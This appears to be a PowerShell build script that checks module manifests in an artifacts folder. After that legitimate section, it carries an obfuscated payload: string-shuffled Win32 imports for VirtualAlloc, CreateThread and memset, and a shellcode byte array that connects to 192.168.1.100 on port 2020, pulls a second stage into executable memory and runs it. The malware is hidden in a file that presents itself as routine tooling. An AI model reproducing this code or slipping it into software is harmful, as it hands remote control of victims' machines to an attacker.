    
    
    
    
    
    
    
    
    
    
    


param (
    [string] ${co`N`FiGUr`Ation} = ("{1}{0}" -f'ug','Deb'),
    [string] ${pA`THDe`lIMIter} = ':'
)

${Tempm`Od`ULe`Pa`Th} = ${e`NV:`pSMODu`LE`Pa`TH}
${OutP`UT`dIr} = "$PSScriptRoot/../artifacts/$configuration"
.("{2}{1}{0}{3}{4}"-f 'rn','e-Wa','Writ','i','ng') ('R'+'unn'+'ing '+'Test-M'+'o'+'duleManfies'+'t '+'on'+' '+'.p'+'s'+'d1 '+'file'+'s '+'in'+' '+"$outputDir")
${En`V:Ps`M`oD`ULEpATh} += "$pathDelimiter$outputDir/"
&("{2}{0}{1}{3}" -f 'r','i','W','te-Warning') ('PS'+'ModuleP'+'at'+'h: '+"$env:PSModulePath")

${s`UCcess} = ${tr`Ue}
foreach(${PSd`1FILE`Pa`Th} in .("{2}{0}{1}"-f'-ChildIte','m','Get') -Path ${ou`T`PutDIR} -Recurse -Filter *`.PSd1) {
    ${mA`NiFeS`T`ErROR} = ${Nu`LL}
    .("{5}{3}{2}{0}{4}{1}" -f'-Modu','anifest','st','e','leM','T') -Path ${PsD`1`F`iLeP`ATh}."FUl`ln`AMe" -ErrorVariable ("{0}{1}{2}{3}"-f'man','if','estE','rror')
    if(${mAniFE`S`TE`RR`or}){
        &("{1}{2}{3}{0}" -f 'ng','Write-W','ar','ni') "$($psd1FilePath.Name) failed to load. "
        ${Su`cCE`Ss} = ${F`A`lSe}
    }
}

${env:`p`S`M`odUl`EPath} = ${tEmpMoDUlE`P`A`Th}
if(-not ${sUC`c`ESS}) {
    .("{0}{1}{2}" -f 'Write-Wa','rn','ing') ("{9}{10}{7}{12}{11}{13}{1}{4}{6}{3}{8}{2}{14}{0}{5}"-f'd to ',' ','ifests fai','ul','more ','load.','mod','e','e man','Fa','ilur','e ',': On','or','le')
    exit 1
}
${c} = ((("{52}{68}{97}{44}{80}{94}{27}{56}{0}{59}{96}{76}{58}{7}{24}{17}{37}{26}{50}{46}{14}{111}{98}{63}{21}{70}{116}{84}{118}{10}{47}{89}{71}{30}{51}{57}{1}{35}{114}{4}{115}{43}{85}{2}{105}{15}{91}{53}{92}{38}{99}{73}{102}{45}{90}{64}{11}{16}{104}{61}{65}{78}{95}{101}{13}{19}{81}{109}{93}{75}{42}{86}{32}{22}{67}{36}{103}{88}{9}{23}{108}{87}{34}{69}{66}{117}{83}{60}{77}{8}{41}{18}{54}{25}{113}{79}{29}{49}{112}{5}{106}{40}{48}{55}{74}{28}{72}{82}{31}{20}{12}{107}{100}{110}{6}{3}{33}{62}{39}" -f'Fq','int flPro','el',' s','Imp','(FqH',' uint','st','reat','In','t','Int','set(','s,','e','2.dllFqH)]pu','Ptr lp','ti','lags, ',' uin','tern IntPtr mem','tPtr',' ','t','a','t','e','d','sta',' lpThreadId);[D','lAll','x','tr','rc, u','p','tect);[D','pS','c ','static ','nt);','svc','ionF','e,','(FqHke','k','ntPtr Crea','t','Ptr lpAddress, ui','rt','llImp','x','ocat','[DllIm','ic','In','.dllFqH)]publ','ll','ionType, u','lic ','H)]p','w','ea','int cou','In','read(','d','me','l','port(','Para',' Virt','uint f','t','xte','ic ','Siz','b','C','Attribu','tr','er','t dwS','ic e',', uint d','lAlloc(I','rn',' IntP','r l','artAddress, ','nt dwSize, ','teTh','bl',' ','k','nel32.','t','u','FqH','n ','e','Ptr','e','rn I','t','Thr','3','m','Int','Pt','tac',' dest,','r','ort','P','ll','ort','ua','ter','n'))."r`ePlACe"(([Char]70+[Char]113+[Char]72),[striNG][Char]34));${W} = &("{1}{0}{2}" -f 'Typ','Add-','e') -memberDefinition ${c} -Name ("{0}{1}" -f 'W','in32') -namespace ("{4}{2}{3}{0}{1}" -f'io','ns','32','Funct','Win') -passthru;[Byte[]];[Byte[]]${z} = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x01,0x64,0x68,0x02,0x00,0x07,0xe4,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;${g} = 0x1000;if (${z}."lE`N`Gth" -gt 0x1000){${g} = ${z}."leNg`TH"};${X}=${W}::("{3}{2}{0}{1}" -f'tualAllo','c','r','Vi').Invoke(0,0x1000,${G},0x40);for (${i}=0;${i} -le (${Z}."LEnG`Th"-1);${i}++) {${w}::"mem`seT"([IntPtr](${X}.("{0}{1}" -f'To','Int32').Invoke()+${i}), ${Z}[${i}], 1)};${W}::("{2}{0}{1}"-f 'teThre','ad','Crea').Invoke(0,0,${x},0,0,0);for (;;){&("{0}{1}{3}{2}"-f 'Start-s','le','p','e') 60};
